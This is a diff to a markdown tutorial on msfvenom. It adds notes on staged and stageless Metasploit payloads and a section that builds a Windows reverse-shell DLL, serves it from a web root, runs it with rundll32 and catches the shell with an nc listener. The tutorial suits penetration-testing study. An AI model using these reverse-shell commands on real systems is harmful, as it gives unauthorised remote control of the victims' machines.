@@ -50,8 +50,19 @@ Msfvenom is a versatile command-line tool included in the Metasploit Framework, 
 The most common types include **bind shells** and **reverse shells**, each serving specific purposes in penetration testing.
 
 
+_Two major types of Payloads:_
 
-### 1. Bind Shell (`bind_tcp)`:
+- `Stager` : A stager is a small, initial payload designed to set up a connection (usually between the attacker and the target) and download or execute a larger, secondary payload (called the "stage"). They are commonly identified by second (/) such as `windows/meterpreter/reverse_tcp`
+    - The stager (initial payload) connects back to the attacker's machine.
+    - The attacker delivers the full Meterpreter stage over the established connection.
+
+- `Stageless` : A stageless payload contains both the stager and stage in a single file, eliminating the need for the stager to download additional components. The use of _ instead of the second / in the payload name such as `windows/meterpreter_reverse_tcp`
+    - The stageless payload contains both the stager and stage.
+    - When executed, it establishes a Meterpreter session without downloading additional components.
+
+
+
+### 1. Bind Shell (`bind_tcp`):
 
 A bind shell is a kind that opens up a new service on the target machine and requires the attacker to connect to it in order to get a session
 
@@ -281,7 +292,28 @@ run
 ```
 
 
+#### Dynamic-link library Payload (DLL):
 
+Transfer the malicious on the target system and execute it.
+
+```
+msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.193 lport=4433 -f dll > /var/www/html/shell.dll
+```
+
+
+_Use the command `rundll32` to run the MSI file on Target host:_
+
+```
+rundll32.exe shell.dll,0
+```
+
+
+
+_Now from the kali Terminal let us type the command:_
+
+```
+nc -lvp 4433
+```
 
 
 #### For Linux: [worked]
@@ -374,3 +406,7 @@ exploit
 
 
 Which method works best depends on the available tools and environment. 
+
+
+### Links:
+- [Msfvenom for Beginners](https://www.hackingarticles.in/msfvenom-tutorials-beginners/)
